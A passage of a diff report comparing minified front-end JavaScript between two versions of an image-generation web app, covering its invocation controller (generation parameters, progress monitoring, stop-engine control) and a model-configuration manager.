this.kwargs.guidance_scale||this.application.config.model.invocation.guidanceScale}set guidanceScale(i){this.guidanceScale!==i&&this.publish("engineGuidanceScaleChange",i),this.kwargs.guidance_scale=i}get inferenceSteps(){return this.kwargs.num_inference_steps||this.application.config.model.invocation.inferenceSteps}set inferenceSteps(i){this.inferenceSteps!==i&&this.publish("engineInferenceStepsChange",i),this.kwargs.num_inference_steps=i}get model(){return this.kwargs.model}set model(i){this.model!==i&&this.publish("engineModelChange",i),this.kwargs.model=i}get modelType(){return this.kwargs.model_type||"checkpoint"}set modelType(i){this.modelType!==i&&this.publish("engineModelTypeChange",i),this.kwargs.model_type=i}get outscale(){return this.kwargs.outscale||1}set outscale(i){this.outscale!==i&&this.publish("engineOutscaleChange",i),this.kwargs.outscale=parseInt(i)}get upscale(){return this.kwargs.upscale}set upscale(i){isEquivalent(this.upscale,i)||this.publish("engineUpscaleChange",i),this.kwargs.upscale=i}get upscaleIterative(){return!0===this.kwargs.upscale_iterative}set upscaleIterative(i){this.upscaleIterative!==i&&this.publish("engineUpscaleIterativeChange",i),this.kwargs.upscale_iterative=i}get upscaleDiffusion(){return!0===this.kwargs.upscale_diffusion}set upscaleDiffusion(i){this.upscaleDiffusion!==i&&this.publish("engineUpscaleDiffusionChange",i),this.kwargs.upscale_diffusion=i}get upscaleDiffusionPrompt(){return this.kwargs.upscale_diffusion_prompt}set upscaleDiffusionPrompt(i){isEquivalent(this.upscaleDiffusionPrompt,i)||this.publish("engineUpscaleDiffusionPromptChange",i),this.kwargs.upscale_diffusion_prompt=i}get upscaleDiffusionNegativePrompt(){return this.kwargs.upscale_diffusion_negative_prompt}set upscaleDiffusionNegativePrompt(i){isEquivalent(this.upscaleDiffusionNegativePrompt,i)||this.publish("engineUpscaleDiffusionNegativePromptChange",i),this.kwargs.upscale_diffusion_negative_prompt=i}get upscaleDiffusionSteps(){return this.kwargs.upscale_diffusion_steps||this.application.config.model.invocation.upscaleDiffusionSteps}set upscaleDiffusionSteps(i){isEquivalent(this.upscaleDiffusionSteps,i)||this.publish("engineUpscaleDiffusionStepsChange",i),this.kwargs.upscale_diffusion_steps=i}get upscaleDiffusionStrength(){return this.kwargs.upscale_diffusion_strength||this.application.config.model.invocation.upscaleDiffusionStrength}set upscaleDiffusionStrength(i){isEquivalent(this.upscaleDiffusionStrength,i)||this.publish("engineUpscaleDiffusionStrengthChange",i),this.kwargs.upscale_diffusion_strength=i}get upscaleDiffusionGuidanceScale(){return this.kwargs.upscale_diffusion_guidance_scale||this.application.config.model.invocation.upscaleDiffusionGuidanceScale}set upscaleDiffusionGuidanceScale(i){isEquivalent(this.upscaleDiffusionGuidanceScale,i)||this.publish("engineUpscaleDiffusionGuidanceScaleChange",i),this.kwargs.upscale_diffusion_guidance_scale=i}get upscaleDiffusionChunkingSize(){return this.kwargs.upscale_diffusion_chunking_size||this.application.config.model.invocation.upscaleDiffusionChunkingSize}set upscaleDiffusionChunkingSize(i){this.upscaleDiffusionChunkingSize!==i&&this.publish("engineUpscaleDiffusionChunkingSizeChange",i),this.kwargs.upscale_diffusion_chunking_size=i}get upscaleDiffusionChunkingBlur(){return this.kwargs.upscale_diffusion_chunking_blur||this.application.config.model.invocation.upscaleDiffusionChunkingBlur}set upscaleDiffusionChunkingBlur(i){this.upscaleDiffusionChunkingBlur!==i&&this.publish("engineUpscaleDiffusionChunkingBlurChange",i),this.kwargs.upscale_diffusion_chunking_blur=i}get upscaleDiffusionScaleChunkingSize(){return!1!==this.kwargs.upscale_diffusion_scale_chunking_size}set upscaleDiffusionScaleChunkingSize(i){this.upscaleDiffusionScaleChunkingSize!==i&&this.publish("engineUpscaleDiffusionScaleChunkingSizeChange",i),this.kwargs.upscale_diffusion_scale_chunking_size=i}get upscaleDiffusionScaleChunkingBlur(){return!1!==this.kwargs.upscale_diffusion_scale_chunking_blur}set upscaleDiffusionScaleChunkingBlur(i){this.upscaleDiffusionScaleChunkingBlur!==i&&this.publish("engineUpscaleDiffusionScaleChunkingBlurChange",i),this.kwargs.upscale_diffusion_scale_chunking_blur=i}get upscaleDiffusionControlnet(){return this.kwargs.upscale_diffusion_controlnet||null}set upscaleDiffusionControlnet(i){isEquivalent(this.upscaleDiffusionControlnet,i)||this.publish("engineUpscaleDiffusionControlnetChange",i),this.kwargs.upscale_diffusion_controlnet=i}get inversion(){return this.kwargs.inversion||[]}set inversion(i){isEquivalent(this.inversion,i)||this.publish("engineInversionChange",i),this.kwargs.inversion=i}get lora(){return this.kwargs.lora||[]}set lora(i){isEquivalent(this.lora,i)||this.publish("engineLoraChange",i),this.kwargs.lora=i}async initialize(){this.loadingBar=E.invocationLoading().content(E.invocationLoaded().addClass("sliding-gradient"),E.invocationDuration(),E.invocationIterations(),E.invocationRemaining().hide()),this.invocationSampleChooser=E.invocationSampleChooser().hide(),this.invocationStop=E.invocationStop().content("Stop").on("click",(()=>{this.stopInvocation()})),(await this.images.getNode()).append(this.loadingBar).append(this.invocationSampleChooser).append(this.invocationStop)}hideSampleChooser(){this.invocationSampleChooser.hide()}async invoke(i,e=!1){i=isEmpty(i)?{}:i;let t={...this.kwargs,...i};if(isEmpty(t.prompt))return void this.notify("Error","Missing Prompt","A prompt is required.");let n=await this.application.model.post("invoke",null,null,t);if(this.invocationStop.addClass("ready"),!isEmpty(n.uuid))if(e){let i=t.prompt.substring(0,this.constructor.truncatePromptLength);i.length===this.constructor.truncatePromptLength&&(i+="..."),await this.startDetachedInvocationMonitor(i,n.uuid,parseInt(t.width)||512,parseInt(t.height)||512)}else await this.canvasInvocation(n.uuid),this.invocationStop.removeClass("ready")}async stopInvocation(){if(this.invocationStop.hasClass("ready"))try{await this.application.model.post("/invocation/stop"),this.invocationStop.removeClass("ready"),this.notify("info","Stopped","Successfully stopped engine.")}catch(i){let e=`${i}`;isEmpty(i.detail)?isEmpty(i.title)||(e=i.title):e=i.detail,this.notify("error","Error",`Received an error when stopping. The engine may still be stopped, wait a moment and check again. ${e}`)}}async monitorInvocation(i,e,t,n){const s=this.application.config.model.invocation.interval||1e3,a=this.application.config.model.queue.interval||5e3,o=this.application.config.model.invocation.errors.consecutive||2;void 0===e&&(e=()=>{}),void 0===t&&(t=()=>{}),void 0===n&&(n=()=>{});let r,u,l,h,c,p,g=(new Date).getTime(),f=i=>"queued"===i.status?a:Math.min(Math.max(s,(()=>{let i=r/(c-g),e=isEmpty(l)?i:l/1e3,t=(u-r)/(.75*e+.25*i)-((new Date).getTime()-c);return isNaN(t)&&(t=1/0),n(t,r,u,l,h),t})()/2),a),m=async()=>{let n,s;for(let e=0;e<o;e++)try{n=await this.application.model.get(`/invocation/${i}`)}catch(i){s=i}if(isEmpty(n))return this.notify("error","Invocation Error",`${o} consecutive errors were detected communicating with the server. Please check the server logs. The last error was: ${s}`),void t();if(n.total!==u&&(isEmpty(u)||(g=(new Date).getTime()),u=n.total),n.step!==r&&(r=n.step,c=(new Date).getTime()),n.rate!==l&&(l=n.rate),h=n.duration,!isEmpty(n.images)){let i=n.images.map((i=>`/api/invocation/${i}`)),t="completed"===n.status;e(i,t)}if("error"===n.status)return this.notify("error","Invocation Failed",n.message),void t();"completed"!==n.status&&(p=setTimeout(m,f(n)))};m()}async canvasInvocation(i){let e,t,n,s,a,o,r,u,l,h,c=!1,p=!1,g=(new Date).getTime(),f=g,m=g,d=g,v=0,w=[],k=this.loadingBar.find(E.getCustomTag("invocationLoaded")),C=this.loadingBar.find(E.getCustomTag("invocationDuration")),S=this.loadingBar.find(E.getCustomTag("invocationIterations")),_=this.loadingBar.find(E.getCustomTag("invocationRemaining")),D=()=>{if(isEmpty(o))this.invocationSampleChooser.hide();else if(0===w.length){this.images.setCurrentInvocationImage(o[0]),this.invocationSampleChooser.empty().append(E.invocationSample().class("no-sample").content("×").on("click",(()=>{v=null,this.images.hideCurrentInvocation()})));for(let i in o){let e=E.img().src(o[i]);w.push(e),this.invocationSampleChooser.append(E.invocationSample().content(e).on("click",(()=>{this.images.setCurrentInvocationImage(e.src()),v=i})))}this.invocationSampleChooser.show().render()}else{for(let i in o)w[i].src(o[i]);null!==v&&this.images.setCurrentInvocationImage(o[v])}},y=()=>{let i=(new Date).getTime();if(p)s<100&&s>0?s+=1:(s=100,c=!0);else if(!isEmpty(t)&&t<1/0){let o=i-m,r=t-(i-n),u=o+r;a=r,e=u,s=o/u*100}f=i,(()=>{let i=f-g;if(C.content(humanDuration(i/1e3)),isEmpty(s))k.css("width","100%"),S.hide(),_.show().content("Initializing…");else if(s<100){_.show().content(humanDuration(a/1e3)),k.css("width",`${s.toFixed(2)}%`);let i=l,e="it/s";!isEmpty(i)&&i<1/0?(i<1&&(i=1/i,e="s/it"),S.show().content(`Iteration ${r}/${u} (${i.toFixed(2)} ${e})`)):S.show().content(`Iteration ${r}/${u}`)}else if(c||isEmpty(h))k.css("width","0"),_.empty().hide();else{_.content("Finalizing step…");let i=u/h,e="it/s";i<1&&(i=1/i,e="s/it"),S.content(`${u} Iterations at ${i.toFixed(2)} ${e}`),k.css("width","100%")}})(),c||requestAnimationFrame((()=>y()))};this.loadingBar.addClass("loading"),this.images.hideCurrentInvocation(),this.invocationSampleChooser.empty(),window.requestAnimationFrame((()=>y())),this.monitorInvocation(i,(async(i,e)=>{p=e,i.length>0&&(o=i,D())}),(()=>{p=!0,c=!0,_.empty().hide(),S.empty().hide()}),((i,e,a,o,c)=>{t=i,r!==e&&(d=n),r=e,l=o,h=c,n=(new Date).getTime(),u!==a&&(m=n,isEmpty(u)||(r=0,s=null,d=n)),u=a})),await waitFor((()=>c)),this.loadingBar.removeClass("loading")}async startDetachedInvocationMonitor(i,e,t,n){let s=!1,a=[],o=[];this.monitorInvocation(e,(async(r,u,l)=>{s=!0;for(let s in r){let u=r[s];if(a.length<=s){let r=new ImageInspectorView(this.application.config,u,e),l=await this.spawnWindow(`${i}, sample ${s+1}`,r,t+30,n+90);r.loading(),a.push(l),o.push(r)}else o[s].setImage(u),a[s].setName(`${i}, ${l} elapsed, sample ${s+1}`)}if(u)for(let e in a)a[e].setName(`${i} complete in ${l}, sample ${e+1}`),o[e].doneLoading()}),(()=>s=!0)),await waitFor((()=>!0===s))}}export{InvocationController};
+import{ImageInspectorView}from"../../view/image.mjs";import{isEmpty,isEquivalent,waitFor,humanDuration}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{Controller}from"../base.mjs";const E=new ElementBuilder({invocationLoading:"enfugue-invocation-loading",invocationLoaded:"enfugue-invocation-loaded",invocationDuration:"enfugue-invocation-duration",invocationIterations:"enfugue-invocation-iterations",invocationRemaining:"enfugue-invocation-remaining",invocationSampleChooser:"enfugue-invocation-sample-chooser",invocationSample:"enfugue-invocation-sample",engineStop:"enfugue-engine-stop"});class InvocationController extends Controller{static truncatePromptLength=36;constructor(e){super(e),this.kwargs={}}get width(){return this.kwargs.width||this.application.config.model.invocation.width}set width(e){this.width!==e&&this.publish("engineWidthChange",e),this.kwargs.width=e}get height(){return this.kwargs.height||this.application.config.model.invocation.height}set height(e){this.height!==e&&this.publish("engineHeightChange",e),this.kwargs.height=e}get size(){return this.kwargs.size||512}set size(e){this.size!==e&&this.publish("engineSizeChange",e),this.kwargs.size=e}get chunkingSize(){return this.kwargs.chunking_size||this.application.config.model.invocation.chunkingSize}set chunkingSize(e){this.chunkingSize!==e&&this.publish("engineChunkingSizeChange",e),this.kwargs.chunking_size=e}get chunkingBlur(){return this.kwargs.chunking_blur||this.application.config.model.invocation.chunkingBlur}set chunkingBlur(e){this.chunkingBlur!==e&&this.publish("engineChunkingBlurChange",e),this.kwargs.chunking_blur=e}get prompt(){return this.kwargs.prompt||""}set prompt(e){this.prompt!==e&&this.publish("enginePromptChange",e),this.kwargs.prompt=e}get negativePrompt(){return this.kwargs.negative_prompt||""}set negativePrompt(e){this.negativePrompt!==e&&this.publish("engineNegativePromptChange",e),this.kwargs.negative_prompt=e}get samples(){return this.kwargs.samples||1}set samples(e){this.samples!==e&&this.publish("engineSamplesChange",e),this.kwargs.samples=e}get seed(){return this.kwargs.seed}set seed(e){this.seed!==e&&this.publish("engineSeedChange",e),this.kwargs.seed=e}get guidanceScale(){return this.kwargs.guidance_scale||this.application.config.model.invocation.guidanceScale}set guidanceScale(e){this.guidanceScale!==e&&this.publish("engineGuidanceScaleChange",e),this.kwargs.guidance_scale=e}get inferenceSteps(){return this.kwargs.num_inference_steps||this.application.config.model.invocation.inferenceSteps}set inferenceSteps(e){this.inferenceSteps!==e&&this.publish("engineInferenceStepsChange",e),this.kwargs.num_inference_steps=e}get model(){return this.kwargs.model}set model(e){this.model!==e&&this.publish("engineModelChange",e),this.kwargs.model=e}get modelType(){return this.kwargs.model_type||"checkpoint"}set modelType(e){this.modelType!==e&&this.publish("engineModelTypeChange",e),this.kwargs.model_type=e}get outscale(){return this.kwargs.outscale||1}set outscale(e){this.outscale!==e&&this.publish("engineOutscaleChange",e),this.kwargs.outscale=parseInt(e)}get upscale(){return this.kwargs.upscale}set upscale(e){isEquivalent(this.upscale,e)||this.publish("engineUpscaleChange",e),this.kwargs.upscale=e}get upscaleIterative(){return!0===this.kwargs.upscale_iterative}set upscaleIterative(e){this.upscaleIterative!==e&&this.publish("engineUpscaleIterativeChange",e),this.kwargs.upscale_iterative=e}get upscaleDiffusion(){return!0===this.kwargs.upscale_diffusion}set upscaleDiffusion(e){this.upscaleDiffusion!==e&&this.publish("engineUpscaleDiffusionChange",e),this.kwargs.upscale_diffusion=e}get upscaleDiffusionPrompt(){return this.kwargs.upscale_diffusion_prompt}set upscaleDiffusionPrompt(e){isEquivalent(this.upscaleDiffusionPrompt,e)||this.publish("engineUpscaleDiffusionPromptChange",e),this.kwargs.upscale_diffusion_prompt=e}get upscaleDiffusionNegativePrompt(){return this.kwargs.upscale_diffusion_negative_prompt}set upscaleDiffusionNegativePrompt(e){isEquivalent(this.upscaleDiffusionNegativePrompt,e)||this.publish("engineUpscaleDiffusionNegativePromptChange",e),this.kwargs.upscale_diffusion_negative_prompt=e}get upscaleDiffusionSteps(){return this.kwargs.upscale_diffusion_steps||this.application.config.model.invocation.upscaleDiffusionSteps}set upscaleDiffusionSteps(e){isEquivalent(this.upscaleDiffusionSteps,e)||this.publish("engineUpscaleDiffusionStepsChange",e),this.kwargs.upscale_diffusion_steps=e}get upscaleDiffusionStrength(){return this.kwargs.upscale_diffusion_strength||this.application.config.model.invocation.upscaleDiffusionStrength}set upscaleDiffusionStrength(e){isEquivalent(this.upscaleDiffusionStrength,e)||this.publish("engineUpscaleDiffusionStrengthChange",e),this.kwargs.upscale_diffusion_strength=e}get upscaleDiffusionGuidanceScale(){return this.kwargs.upscale_diffusion_guidance_scale||this.application.config.model.invocation.upscaleDiffusionGuidanceScale}set upscaleDiffusionGuidanceScale(e){isEquivalent(this.upscaleDiffusionGuidanceScale,e)||this.publish("engineUpscaleDiffusionGuidanceScaleChange",e),this.kwargs.upscale_diffusion_guidance_scale=e}get upscaleDiffusionChunkingSize(){return this.kwargs.upscale_diffusion_chunking_size||this.application.config.model.invocation.upscaleDiffusionChunkingSize}set upscaleDiffusionChunkingSize(e){this.upscaleDiffusionChunkingSize!==e&&this.publish("engineUpscaleDiffusionChunkingSizeChange",e),this.kwargs.upscale_diffusion_chunking_size=e}get upscaleDiffusionChunkingBlur(){return this.kwargs.upscale_diffusion_chunking_blur||this.application.config.model.invocation.upscaleDiffusionChunkingBlur}set upscaleDiffusionChunkingBlur(e){this.upscaleDiffusionChunkingBlur!==e&&this.publish("engineUpscaleDiffusionChunkingBlurChange",e),this.kwargs.upscale_diffusion_chunking_blur=e}get upscaleDiffusionScaleChunkingSize(){return!1!==this.kwargs.upscale_diffusion_scale_chunking_size}set upscaleDiffusionScaleChunkingSize(e){this.upscaleDiffusionScaleChunkingSize!==e&&this.publish("engineUpscaleDiffusionScaleChunkingSizeChange",e),this.kwargs.upscale_diffusion_scale_chunking_size=e}get upscaleDiffusionScaleChunkingBlur(){return!1!==this.kwargs.upscale_diffusion_scale_chunking_blur}set upscaleDiffusionScaleChunkingBlur(e){this.upscaleDiffusionScaleChunkingBlur!==e&&this.publish("engineUpscaleDiffusionScaleChunkingBlurChange",e),this.kwargs.upscale_diffusion_scale_chunking_blur=e}get upscaleDiffusionControlnet(){return this.kwargs.upscale_diffusion_controlnet||null}set upscaleDiffusionControlnet(e){isEquivalent(this.upscaleDiffusionControlnet,e)||this.publish("engineUpscaleDiffusionControlnetChange",e),this.kwargs.upscale_diffusion_controlnet=e}get inversion(){return this.kwargs.inversion||[]}set inversion(e){isEquivalent(this.inversion,e)||this.publish("engineInversionChange",e),this.kwargs.inversion=e}get lora(){return this.kwargs.lora||[]}set lora(e){isEquivalent(this.lora,e)||this.publish("engineLoraChange",e),this.kwargs.lora=e}get lycoris(){return this.kwargs.lycoris||[]}set lycoris(e){isEquivalent(this.lycoris,e)||this.publish("engineLycorisChange",e),this.kwargs.lycoris=e}get refiner(){return this.kwargs.refiner||null}set refiner(e){this.refiner!==e&&this.publish("engineRefinerChange",e),this.kwargs.refiner=e}get refinerSize(){return this.kwargs.refiner_size||null}set refinerSize(e){this.refinerSize!==e&&this.publish("engineRefinerSizeChange",e),this.kwargs.refiner_size=e}get refinerStrength(){return this.kwargs.refiner_strength||.3}set refinerStrength(e){this.refinerStrength!==e&&this.publish("engineRefinerStrengthChange",e),this.kwargs.refiner_strength=e}get refinerGuidanceScale(){return this.kwargs.refiner_guidance_scale||5}set refinerGuidanceScale(e){this.refinerGuidanceScale!==e&&this.publish("engineRefinerGuidanceScaleChange",e),this.kwargs.refiner_guidance_scale=e}get refinerAestheticScore(){return this.kwargs.refiner_aesthetic_score||6}set refinerAestheticScore(e){this.refinerAestheticScore!==e&&this.publish("engineAestheticScoreChange",e),this.kwargs.refiner_aesthetic_score=e}get refinerNegativeAestheticScore(){return this.kwargs.refiner_negative_aesthetic_score||2.5}set refinerNegativeAestheticScore(e){this.refinerNegativeAestheticScore!==e&&this.publish("engineNegativeAestheticScoreChange",e),this.kwargs.refiner_negative_aesthetic_score=e}get inpainter(){return this.kwargs.inpainter||null}set inpainter(e){this.inpainter!==e&&this.publish("engineInpainterChange",e),this.kwargs.inpainter=e}get inpainterSize(){return this.kwargs.inpainter_size||null}set inpainterSize(e){this.inpainterSize!==e&&this.publish("engineInpainterSizeChange",e),this.kwargs.inpainter_size=e}get scheduler(){return this.kwargs.scheduler||null}set scheduler(e){this.scheduler!==e&&this.publish("engineSchedulerChange"),this.kwargs.scheduler=e}get multiScheduler(){return this.kwargs.multi_scheduler||null}set multiScheduler(e){this.multiScheduler!==e&&this.publish("engineMultiDiffusionSchedulerChange"),this.kwargs.multi_scheduler=e}get vae(){return this.kwargs.vae||null}set vae(e){this.vae!==e&&this.publish("engineVaeChange"),this.kwargs.vae=e}async initialize(){this.loadingBar=E.invocationLoading().content(E.invocationLoaded().addClass("sliding-gradient"),E.invocationDuration(),E.invocationIterations(),E.invocationRemaining().hide()),this.invocationSampleChooser=E.invocationSampleChooser().hide(),this.engineStop=E.engineStop().content("Stop Engine").on("click",(()=>{this.stopEngine()})),(await this.images.getNode()).append(this.loadingBar).append(this.invocationSampleChooser),this.application.container.appendChild(await this.engineStop.render()),this.subscribe("engineReady",(()=>{this.enableStop()})),this.subscribe("engineBusy",(()=>{this.enableStop()})),this.subscribe("engineIdle",(()=>{this.disableStop()}))}hideSampleChooser(){this.invocationSampleChooser.hide()}enableStop(){this.engineStop.addClass("ready")}disableStop(){this.engineStop.removeClass("ready")}async invoke(e,i=!1){e=isEmpty(e)?{}:e;let t={...this.kwargs,...e};if(isEmpty(t.prompt))return void this.notify("Error","Missing Prompt","A prompt is required.");let n=await this.application.model.post("invoke",null,null,t);if(this.enableStop(),!isEmpty(n.uuid))if(i){let e=t.prompt.substring(0,this.constructor.truncatePromptLength);e.length===this.constructor.truncatePromptLength&&(e+="..."),await this.startDetachedInvocationMonitor(e,n.uuid,parseInt(t.width)||512,parseInt(t.height)||512)}else await this.canvasInvocation(n.uuid)}async stopEngine(){if(this.engineStop.hasClass("ready")&&await this.confirm("Stop engine and terminate any active invocations?"))try{await this.application.model.post("/invocation/stop"),this.disableStop(),this.notify("info","Stopped","Successfully stopped engine.")}catch(e){let i=`${e}`;isEmpty(e.detail)?isEmpty(e.title)||(i=e.title):i=e.detail,this.notify("error","Error",`Received an error when stopping. The engine may still be stopped, wait a moment and check again. ${i}`)}}async monitorInvocation(e,i,t,n){const s=this.application.config.model.invocation.interval||1e3,a=this.application.config.model.queue.interval||5e3,o=this.application.config.model.invocation.errors.consecutive||2;void 0===i&&(i=()=>{}),void 0===t&&(t=()=>{}),void 0===n&&(n=()=>{});let r,h,u,l,g,c,p=(new Date).getTime(),f=async()=>{let d,m;for(let i=0;i<o;i++)try{d=await this.application.model.get(`/invocation/${e}`)}catch(e){m=e}if(isEmpty(d))return this.notify("error","Invocation Error",`${o} consecutive errors were detected communicating with the server. Please check the server logs. The last error was: ${m}`),void t();if(d.total!==h&&(isEmpty(h)||(p=(new Date).getTime()),h=d.total),d.step!==r&&(r=d.step,g=(new Date).getTime()),d.rate!==u&&(u=d.rate),l=d.duration,!isEmpty(d.images)){let e=d.images.map((e=>`/api/invocation/${e}`)),t="completed"===d.status;i(e,t)}if("error"===d.status)return this.notify("error","Invocation Failed",d.message),void t();if("completed"!==d.status){let e=r/(g-p),i=isEmpty(u)?e:u/1e3,t=(h-r)/(.75*i+.25*e)-((new Date).getTime()-g);isNaN(t)&&(t=1/0),n(t,r,h,u,l),c=setTimeout(f,(e=>"queued"===e.status?a:s)(d))}};f()}async canvasInvocation(e){let i,t,n,s,a,o,r,h,u,l,g=!1,c=!1,p=(new Date).getTime(),f=p,d=p,m=p,w=0,v=[],k=this.loadingBar.find(E.getCustomTag("invocationLoaded")),S=this.loadingBar.find(E.getCustomTag("invocationDuration")),C=this.loadingBar.find(E.getCustomTag("invocationIterations")),_=this.loadingBar.find(E.getCustomTag("invocationRemaining")),b=()=>{if(isEmpty(o))this.invocationSampleChooser.hide();else if(0===v.length){this.images.setCurrentInvocationImage(o[0]),this.invocationSampleChooser.empty().append(E.invocationSample().class("no-sample").content("×").on("click",(()=>{w=null,this.images.hideCurrentInvocation()})));for(let e in o){let i=E.img().src(o[e]);v.push(i),this.invocationSampleChooser.append(E.invocationSample().content(i).on("click",(()=>{this.images.setCurrentInvocationImage(i.src()),w=e})))}this.invocationSampleChooser.show().render()}else{for(let e in o)v[e].src(o[e]);null!==w&&this.images.setCurrentInvocationImage(o[w])}},D=()=>{let e=(new Date).getTime();if(c)s<100&&s>0?s+=1:(s=100,g=!0);else if(!isEmpty(t)&&t<1/0){let o=e-d,r=t-(e-n),h=o+r;a=r,i=h,s=o/h*100}f=e,(()=>{let e=f-p;if(S.content(humanDuration(e/1e3)),isEmpty(s))k.css("width","100%"),C.hide(),_.show().content("Initializing…");else if(s<100){_.show().content(humanDuration(a/1e3)),k.css("width",`${s.toFixed(2)}%`);let e=u,i="it/s";!isEmpty(e)&&e<1/0?(e<1&&(e=1/e,i="s/it"),C.show().content(`Iteration ${r}/${h} (${e.toFixed(2)} ${i})`)):C.show().content(`Iteration ${r}/${h}`)}else if(g||isEmpty(l))k.css("width","0"),_.empty().hide();else{_.content("Finalizing step…");let e=h/l,i="it/s";e<1&&(e=1/e,i="s/it"),C.content(`${h} Iterations at ${e.toFixed(2)} ${i}`),k.css("width","100%")}})(),g||requestAnimationFrame((()=>D()))};this.loadingBar.addClass("loading"),this.images.hideCurrentInvocation(),this.invocationSampleChooser.empty(),window.requestAnimationFrame((()=>D())),this.monitorInvocation(e,(async(e,i)=>{c=i,e.length>0&&(o=e,b())}),(()=>{c=!0,g=!0,_.empty().hide(),C.empty().hide()}),((e,i,a,o,g)=>{t=e,r!==i&&(m=n),r=i,u=o,l=g,n=(new Date).getTime(),h!==a&&(d=n,isEmpty(h)||(r=0,s=null,m=n)),h=a})),await waitFor((()=>g)),this.loadingBar.removeClass("loading")}async startDetachedInvocationMonitor(e,i,t,n){let s=!1,a=[],o=[];this.monitorInvocation(i,(async(r,h,u)=>{s=!0;for(let s in r){let h=r[s];if(a.length<=s){let r=new ImageInspectorView(this.application.config,h,i),u=await this.spawnWindow(`${e}, sample ${s+1}`,r,t+30,n+90);r.loading(),a.push(u),o.push(r)}else o[s].setImage(h),a[s].setName(`${e}, ${u} elapsed, sample ${s+1}`)}if(h)for(let i in a)a[i].setName(`${e} complete in ${u}, sample ${i+1}`),o[i].doneLoading()}),(()=>s=!0)),await waitFor((()=>!0===s))}}export{InvocationController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/common/model-manager.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/system/02-users.mjs`

 * *Files 24% similar despite different names*

```diff
@@ -1 +1 @@
-import{Controller}from"../base.mjs";import{ParentView}from"../../view/base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TableView,ModelTableView}from"../../view/table.mjs";import{StringInputView,TextInputView,FloatInputView,NumberInputView,FormInputView,RepeatableInputView,SearchListInputView,ButtonInputView}from"../../view/forms/input.mjs";import{isEmpty,deepClone}from"../../base/helpers.mjs";class InversionInputView extends SearchListInputView{}class LoraInputView extends SearchListInputView{}class CheckpointInputView extends SearchListInputView{}class LoraFormView extends FormView{static autoSubmit=!0;static fieldSets={LoRA:{model:{label:"Model",class:LoraInputView,config:{required:!0}},weight:{label:"Weight",class:FloatInputView,config:{min:0,value:1,step:.01,required:!0}}}}}class LoraFormInputView extends FormInputView{static formClass=LoraFormView}class MultiLoraInputView extends RepeatableInputView{static memberClass=LoraFormInputView}class MultiInversionInputView extends RepeatableInputView{static memberClass=InversionInputView}class ModelForm extends FormView{static canCancel=!0;static fieldSets={Name:{name:{class:StringInputView,label:"Name",config:{required:!0}}},Model:{checkpoint:{class:CheckpointInputView,label:"Checkpoint",config:{required:!0}},lora:{class:MultiLoraInputView,label:"LoRA"},inversion:{class:MultiInversionInputView,label:"Textual Inversions"}},Engine:{size:{class:NumberInputView,label:"Size",config:{required:!0,value:512,min:128,max:2048,step:8}}},Prompts:{prompt:{class:TextInputView,label:"Prompt"},negative_prompt:{class:TextInputView,label:"Negative Prompt"}}}}class NewModelInputView extends ButtonInputView{static defaultValue="New Model";static className="new-model-input-view"}class ModelManagerController extends Controller{static modelWindowWidth=400;static modelWindowHeight=1e3;static managerWindowWidth=800;static managerWindowHeight=600;async createManager(){this.tableView=new ModelTableView(this.config,this.model.DiffusionModel),this.buttonView=new NewModelInputView(this.config),this.tableView.setColumns({name:"Name",model:"Model",size:"Size",prompt:"Prompt",negative_prompt:"Negative Prompt"}),this.tableView.setFormatter("size",(e=>`${e}px`)),this.tableView.addButton("Edit","fa-solid fa-edit",(async e=>{let t=e.getAttributes();t.checkpoint=t.model,t.lora=isEmpty(e.lora)?[]:e.lora.map((e=>e.getAttributes())),t.inversion=isEmpty(e.inversion)?[]:e.inversion.map((e=>e.model));let i,o=new ModelForm(this.config,deepClone(t));o.onSubmit((async t=>{try{await this.model.put(`/models/${e.name}`,null,null,t),isEmpty(i)||i.remove(),this.tableView.requery()}catch(e){let t=isEmpty(e)?"Couldn't communicate with server.":isEmpty(e.detail)?`${e}`:e.detail;this.notify("error","Couldn't update model",t),o.enable()}})),o.onCancel((()=>i.remove())),i=await this.spawnWindow(`Edit ${e.name}`,o,this.constructor.modelWindowWidth,this.constructor.modelWindowHeight)})),this.tableView.addButton("Delete","fa-solid fa-trash",(async e=>{try{await this.model.delete(`/models/${e.name}`),this.tableView.requery()}catch(e){let t=isEmpty(e)?"Couldn't communicate with server.":isEmpty(e.detail)?`${e}`:e.detail;this.notify("error","Couldn't delete model",t),modelForm.enable()}})),this.buttonView.onChange((()=>{this.showNewModel()}));let e=new ParentView(this.config);return e.addChild(this.tableView),e.addChild(this.buttonView),e}async createModelForm(){let e=new ModelForm(this.config);return e.onSubmit((async e=>{try{await this.model.post("/models",null,null,e);isEmpty(this.newModelWindow)||(this.newModelWindow.remove(),this.newModelWindow=null),isEmpty(this.managerWindow)||isEmpty(this.tableView)||this.tableView.requery()}catch(e){let t=isEmpty(e)?"Couldn't communicate with server.":isEmpty(e.detail)?`${e}`:e.detail;this.notify("Error","Couldn't create model",t)}})),e.onCancel((()=>{this.newModelWindow.remove(),this.newModelWindow=null})),e}async showNewModel(){isEmpty(this.newModelWindow)?(this.newModelWindow=await this.spawnWindow("New Configuration",this.createModelForm(),this.constructor.modelWindowWidth,this.constructor.modelWindowHeight),this.newModelWindow.onClose((()=>{delete this.newModelWindow}))):this.newModelWindow.focus()}async showManager(){isEmpty(this.managerWindow)?(this.managerWindow=await this.spawnWindow("Model Configuration Manager",this.createManager(),this.constructor.managerWindowWidth,this.constructor.managerWindowHeight),this.managerWindow.onClose((()=>{delete this.managerWindow}))):this.managerWindow.focus()}async initialize(){LoraInputView.defaultOptions=async()=>this.model.get("/lora"),CheckpointInputView.defaultOptions=async()=>this.model.get("/checkpoints"),InversionInputView.defaultOptions=async()=>this.model.get("/inversions")}}export{ModelManagerController,MultiLoraInputView,MultiInversionInputView};
